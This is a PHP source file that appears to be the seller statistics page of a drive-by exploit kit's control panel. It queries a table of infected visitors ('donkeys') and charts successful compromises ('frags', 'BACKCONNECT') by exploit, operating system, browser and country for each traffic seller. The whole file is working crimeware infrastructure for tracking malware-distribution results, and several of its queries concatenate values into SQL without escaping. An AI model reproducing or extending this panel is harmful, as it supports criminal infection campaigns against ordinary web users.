<?php

include("./secure/config.php");
mysql_connect($config['MysqlHost'], $config['MysqlUser'], $config['MysqlPassword']) or die("Could not connect to mysql server.");
mysql_select_db($config['MysqlDbname']) or die("Could not select database.");




if (!$row = mysql_fetch_array(mysql_query("SELECT `id` FROM `sellers` WHERE `hash` = '" . ((isset($_GET['seller']) AND $_GET['seller'] != '0') ? mysql_real_escape_string($_GET['seller']) : "") . "'"))){
	exit("Seller not found");
}
$seller_id = $row['id'];
$globalstat = mysql_fetch_array(mysql_query("SELECT SUM(1) AS `all`, SUM(`status` <> 'NOT') AS `frags` FROM `donkeys` WHERE `seller` = '" . $seller_id . "'"));
if (strlen($globalstat['all']) < 1){
	$globalstat['all'] = 0;
	$globalstat['frags'] = 0;
	$globalstat['percent'] = 0;
} else {
	$globalstat['percent'] = round($globalstat['frags'] / $globalstat['all'] * 100, 2);
}
if (isset($_GET['get_ajax']) AND $_GET['get_ajax'] == "1"){
	echo $globalstat['all'] . "|" . $globalstat['frags'];
	exit();
}

	include("./secure/geoip.php");
	$gi = new GeoIP;


	if (isset($_GET['img']) AND $_GET['img'] == "exploits"){
		include("./secure/pchart.php");
		$explarray = array();
		$exploitsdir = scandir("./secure/exploits");
		for ($i = 0; $i < count($exploitsdir); $i++){
			if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
				list($name) = explode(".", $exploitsdir[$i]);
				list($id, $namee) = explode("-", $name);
				$explarray[$id] = $namee;
			}
		}
		$result = mysql_query("SELECT `exploit`, SUM(1) AS `all`, SUM(`status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `status` <> 'NOT' AND `seller` = '" . $seller_id . "' GROUP BY `exploit` ORDER BY `loaded` DESC, `all` DESC LIMIT 6");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$browsers[] = ($row['exploit'] == 0) ? "OTHER" : $explarray[$row['exploit']];
		}

		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("Frags","Serie1");
		$DataSet->SetSerieName("Feedback","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(395,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/exploits.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/exploits.png");
		unlink("./secure/files/exploits.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "os"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `os`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `os` ORDER BY `loaded` DESC, `all` DESC LIMIT 8");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			if ($row['os'] == "95" OR $row['os'] == "98" OR $row['os'] == "2000" OR $row['os'] == "2003"){
				$browsers[] = chr(160) . $row['os'];
			} else {
				$browsers[] = $row['os'];
			}
		}
		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/os.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/os.png");
		unlink("./secure/files/os.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "browsers"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `browser`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `browser` ORDER BY `loaded` DESC, `all` DESC");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$browsers[] = $row['browser'];
		}
		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/browsers.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/browsers.png");
		unlink("./secure/files/browsers.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "country"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `country`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `country` ORDER BY `loaded` DESC, `all` DESC LIMIT 10");
		$countrys = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$countrys[] = ($row['country'] == 0) ? "??" : $gi->GEOIP_COUNTRY_CODES[$row['country']];
		}
		$DataSet = new pData;
		if (count($countrys) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($countrys,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/country.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/country.png");
		unlink("./secure/files/country.png");
		exit();
	}


	///////
	$result = mysql_query("SELECT `browser`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `browser` ORDER BY `loaded` DESC, `all` DESC");
	$browsers = array();
	$browsers['browser'] = array();
	$browsers_versions = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$browsers['browser'][$i] = $row['browser'];
		$browsers['all'][$i] = $row['all'];
		$browsers['frags'][$i] = $row['loaded'];
		$z = 0;
		$result2 = mysql_query("SELECT `browser_version` AS `version`, SUM(1) AS `sum`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `frags` FROM `donkeys` WHERE `browser` = '" . $row['browser'] . "' AND `seller` = '" . $seller_id . "' GROUP BY `browser_version` ORDER BY `frags` DESC, `sum` DESC LIMIT 10");
		while ($row2 = mysql_fetch_array($result2)){
			$browsers_versions[$row['browser']]['version'][$z] = $row2['version'];
			$browsers_versions[$row['browser']]['sum'][$z] = $row2['sum'];
			$browsers_versions[$row['browser']]['frags'][$z] = $row2['frags'];
			$z++;
		}
		$i++;
	}

	///////
	$result = mysql_query("SELECT `os`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `os` ORDER BY `loaded` DESC, `all` DESC");
	$oss = array();
	$oss['os'] = array();
	$oss_versions = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$oss['os'][$i] = $row['os'];
		$oss['all'][$i] = $row['all'];
		$oss['frags'][$i] = $row['loaded'];
		$z = 0;
		$result2 = mysql_query("SELECT `os_version` AS `version`, SUM(1) AS `sum`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `frags` FROM `donkeys` WHERE `os` = '" . $row['os'] . "' AND `seller` = '" . $seller_id . "' GROUP BY `os_version` ORDER BY `frags` DESC LIMIT 10");
		while ($row2 = mysql_fetch_array($result2)){
			$oss_versions[$row['os']]['version'][$z] = $row2['version'];
			$oss_versions[$row['os']]['sum'][$z] = $row2['sum'];
			$oss_versions[$row['os']]['frags'][$z] = $row2['frags'];
			$z++;
		}
		$i++;
	}

	///////
	$result = mysql_query("SELECT `country`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `seller` = '" . $seller_id . "' GROUP BY `country` ORDER BY `loaded` DESC, `all` DESC LIMIT 10");
	$countrys = array();
	$countrys['country'] = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$countrys['country'][$i] = $row['country'];
		$countrys['all'][$i] = $row['all'];
		$countrys['frags'][$i] = $row['loaded'];
		$i++;
	}

	///////
	$explarray = array();
	$exploitsdir = scandir("./secure/exploits");
	for ($i = 0; $i < count($exploitsdir); $i++){
		if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
			list($name) = explode(".", $exploitsdir[$i]);
			list($id, $namee) = explode("-", $name);
			$explarray[$id] = $namee;
		}
	}
	$result = mysql_query("SELECT `exploit`, SUM(1) AS `loaded`, SUM(`status` = 'BACKCONNECT') AS `all` FROM `donkeys` WHERE `status` <> 'NOT' AND `seller` = '" . $seller_id . "' GROUP BY `exploit` ORDER BY `all` DESC, `loaded` DESC");
	$exploit = array();
	$exploit['exploit'] = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$exploit['exploit'][$i] = ($row['exploit'] == 0) ? "OTHER" : $explarray[$row['exploit']];
		$exploit['all'][$i] = $row['all'];
		$exploit['frags'][$i] = $row['loaded'];
		$i++;
	}


	include("./secure/templates/" . $config['AdminDefaultLanguage'] . "/seller_statistics.php");


?>